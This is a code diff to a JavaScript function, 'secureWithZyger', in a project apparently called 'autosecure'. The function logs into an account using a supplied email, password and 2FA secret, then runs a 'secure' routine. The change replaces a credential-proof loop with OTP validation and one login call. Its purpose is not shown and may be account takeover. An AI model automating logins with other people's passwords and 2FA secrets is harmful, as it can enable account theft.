@@ -259,16 +259,15 @@ async function secureWithZyger({ userId, email, password, secretKey, mcign }) {
     const generateotp = require('../../autosecure/utils/secure/codefromsecret');
     const login = require('../../autosecure/utils/secure/login');
     const secure = require('../../autosecure/utils/secure/recodesecure');
-    const getCredentials = require('../../autosecure/utils/info/getCredentials');
 
-    const totpCode = await generateotp(secretKey);
-    const creds = await getCredentials(email, false);
-    const proofs = creds?.Credentials?.OtcLoginEligibleProofs || [];
+    const otpResult = await generateotp(secretKey);
+    if (!otpResult || !otpResult.otp) {
+      return { success: false, error: 'Invalid 2FA secret key (must be valid Base32).' };
+    }
 
-    let host = null;
-    for (const sec of proofs) {
-      host = await login({ email, id: sec.data, code: totpCode, password }, creds);
-      if (host) break;
+    const host = await login({ otp: otpResult.otp, email, pw: password }, null);
+    if (host === 'tfa') {
+      return { success: false, error: 'Invalid credentials or 2FA is not enabled on this account.' };
     }
 
     const uid = generateUid();
